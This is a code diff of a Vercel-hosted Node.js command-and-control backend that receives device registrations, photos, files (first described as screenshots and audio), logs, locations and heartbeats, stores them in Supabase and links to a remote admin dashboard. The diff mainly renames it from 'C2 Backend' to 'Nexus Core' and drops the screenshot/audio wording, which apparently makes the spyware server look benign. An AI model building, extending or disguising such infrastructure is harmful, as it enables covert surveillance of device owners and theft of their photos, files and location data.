@@ -1,5 +1,5 @@
 // ============================================================
-//  ULTIMATE C2 BACKEND – Modern UI + All Features
+//  NEXUS CORE — Central API & Status Panel
 //  Deploy on Vercel
 // ============================================================
 
@@ -43,13 +43,13 @@ module.exports = async (req, res) => {
     console.log(`[${req.method}] ${path}`);
 
     // ============================================================
-    //  ROOT – MODERN LANDING PAGE (with Dashboard button)
+    //  ROOT – LANDING PAGE (Nexus Core)
     // ============================================================
     if (path === '/') {
         return res.send(`<!DOCTYPE html>
 <html>
 <head>
-    <title>C2 Backend</title>
+    <title>Nexus Core</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
@@ -70,8 +70,8 @@ module.exports = async (req, res) => {
 <body>
 <div class="card">
     <span class="icon">☠️</span>
-    <h1>C2 Backend</h1>
-    <p class="sub">Your command & control server is running.</p>
+    <h1>Nexus Core</h1>
+    <p class="sub">Your central command & control server is running.</p>
 
     <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank" class="btn">
         📊 Open Dashboard
@@ -84,7 +84,7 @@ module.exports = async (req, res) => {
     <div class="endpoints">
         <div><span class="highlight">POST</span> /api/register — Register device</div>
         <div><span class="highlight">POST</span> /api/photo — Upload photo</div>
-        <div><span class="highlight">POST</span> /api/upload-file — Upload file (screenshot/audio)</div>
+        <div><span class="highlight">POST</span> /api/upload-file — Upload file</div>
         <div><span class="highlight">POST</span> /api/log — Add log</div>
         <div><span class="highlight">POST</span> /api/location — Add location</div>
         <div><span class="highlight">POST</span> /api/heartbeat — Heartbeat</div>
@@ -106,7 +106,7 @@ module.exports = async (req, res) => {
     }
 
     // ============================================================
-    //  MODERN STATUS PANEL – /api/test (full HTML)
+    //  MODERN STATUS PANEL – /api/test (Nexus branding)
     // ============================================================
     if (path === '/api/test') {
         // Run health checks
@@ -180,7 +180,7 @@ module.exports = async (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Status</title>
+    <title>Nexus Status</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body {
@@ -203,7 +203,6 @@ module.exports = async (req, res) => {
             from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
-
         .header {
             display: flex;
             justify-content: space-between;
@@ -242,9 +241,7 @@ module.exports = async (req, res) => {
         .badge .dot.green { background: #6fcf97; }
         .badge .dot.yellow { background: #ffaa44; }
         .badge .dot.red { background: #ff5e5e; }
-
         .header .time { color: #4a6a7a; font-size: 13px; font-family: 'Courier New', monospace; }
-
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
@@ -264,9 +261,7 @@ module.exports = async (req, res) => {
         .card .value { font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
         .card .value .icon { font-size: 20px; }
         .card .sub { font-size: 12px; color: #4a6a7a; margin-top: 4px; }
-
         .card-full { grid-column: 1 / -1; }
-
         .table-wrap {
             overflow-x: auto;
             margin-top: 6px;
@@ -293,7 +288,6 @@ module.exports = async (req, res) => {
         }
         .table-wrap td .status-icon { font-size: 16px; }
         .table-wrap tr:hover td { background: rgba(255,255,255,0.02); }
-
         .footer-text { text-align: center; margin-top: 24px; font-size: 11px; color: #4a4a6a; }
         .footer-text a { color: #88ccff; text-decoration: none; }
         .footer-text a:hover { text-decoration: underline; }
@@ -307,9 +301,8 @@ module.exports = async (req, res) => {
 </head>
 <body>
 <div class="container">
-
     <div class="header">
-        <h1><span>☠️</span> System Status</h1>
+        <h1><span>☠️</span> Nexus Status</h1>
         <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
             <span class="badge ${allGreen ? 'success' : 'warning'}">
                 <span class="dot ${allGreen ? 'green' : 'yellow'}"></span>
@@ -415,7 +408,7 @@ module.exports = async (req, res) => {
 
     <div class="footer-text">
         🔐 Dashboard: <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank">Open Admin Panel</a>
-        &nbsp;·&nbsp; ⚡ C2 Backend v2.0
+        &nbsp;·&nbsp; ⚡ Nexus Core v2.0
     </div>
 </div>
 </body>
@@ -508,7 +501,6 @@ module.exports = async (req, res) => {
         if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
         const { deviceId, fileType, content, dataUrl, timestamp } = req.body || {};
         if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
-
         let fileUrl = null, storagePath = null;
         if (dataUrl && dataUrl.startsWith('data:')) {
             try {
@@ -519,7 +511,6 @@ module.exports = async (req, res) => {
                 if (!uploadError) { storagePath = fileName; const { data: urlData } = supabase.storage.from('files').getPublicUrl(fileName); fileUrl = urlData?.publicUrl || null; }
             } catch (e) { console.error('File storage error:', e); }
         }
-
         const { error: dbError } = await supabase.from('files').insert([{
             device_id: deviceId,
             file_type: fileType || 'unknown',
@@ -694,5 +685,8 @@ module.exports = async (req, res) => {
     // ============================================================
     //  404
     // ============================================================
-    return res.status(404).json({ error: 'Not Found', path });
+    return res.status(404).json({
+        error: 'Not Found',
+        path: path
+    });
 };
